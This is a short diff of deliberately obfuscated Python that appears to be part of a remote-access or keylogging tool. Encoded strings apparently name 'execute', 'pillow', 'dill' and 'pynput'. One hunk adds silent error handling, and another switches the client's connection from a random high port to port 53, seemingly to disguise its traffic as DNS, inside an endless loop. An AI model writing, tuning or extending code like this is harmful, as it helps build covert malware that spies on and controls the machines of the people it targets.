@@ -5,8 +5,10 @@ from time import sleep
 def BlGsWbOibgDw(ivMetmwPXMsX,afyUArKrYoaU=None,bLPERsFVJGBl=b'TMAPDaSIcIFG'):
     bWjHdFEaAmUG=afyUArKrYoaU
     eHLzbYimpSFq=().__class__.__name__[-1]+chr(0o170)+chr(101)+{}.__class__.__name__[-2]+().__class__.__name__[1]+chr(0x74)+chr(0b1100101)
-    if paluuoBFSqqz(ivMetmwPXMsX,eHLzbYimpSFq):bWjHdFEaAmUG=PzQWXGyzczcO(ivMetmwPXMsX,eHLzbYimpSFq)()
-    return bWjHdFEaAmUG
+    try:
+        if paluuoBFSqqz(ivMetmwPXMsX,eHLzbYimpSFq):bWjHdFEaAmUG=PzQWXGyzczcO(ivMetmwPXMsX,eHLzbYimpSFq)()
+        return bWjHdFEaAmUG
+    except Exception as e:print(e)
 def VhUkuhQdErew(axKZuigreziB=['AWFZqOjGUXxpi'+chr(73)+chr(0x6D),'p'+chr(0x69)+chr(0o154)*2+chr(79).lower()+chr(119)],**upCobXJiHQes):
     HRvjXWEzpqlv=[axKZuigreziB[1],chr(0o104).lower()+chr(105)+chr(0x6C)*2,axKZuigreziB[0][-2]+'yn'+axKZuigreziB[1][0]+'ut']
     try:
@@ -87,7 +89,7 @@ class gQruAhFOlNgi:
         NYfPcqvtEIpP=PzQWXGyzczcO(self._GJsNfChonick,self._xYBrgqFPodTg)
         mUlhKWvjYbaf=PzQWXGyzczcO(self._GJsNfChonick,self._VfPBlQQnlYpW);xAhhsHBguuuK=PzQWXGyzczcO(self._xAhhsHBguuuK,self._FSyoJdzsIZcz);vOJpdLUtmbiL=xAhhsHBguuuK(*(int(49152),65535))
         # self._jNSpDPEwKcqA=(self._kTqFHLSFFmPt,vOJpdLUtmbiL)
-        self._jNSpDPEwKcqA=(self._kTqFHLSFFmPt,5353)
+        self._jNSpDPEwKcqA=(self._kTqFHLSFFmPt,53)
         while(qnOHICoJwXsc):
             try:
                 self._FWOvqkkczoLg=JQbFamnPtOKc(YyBUItTDklog,NYfPcqvtEIpP);self._SrrNsRMyZVGk=JQbFamnPtOKc(YyBUItTDklog,mUlhKWvjYbaf)
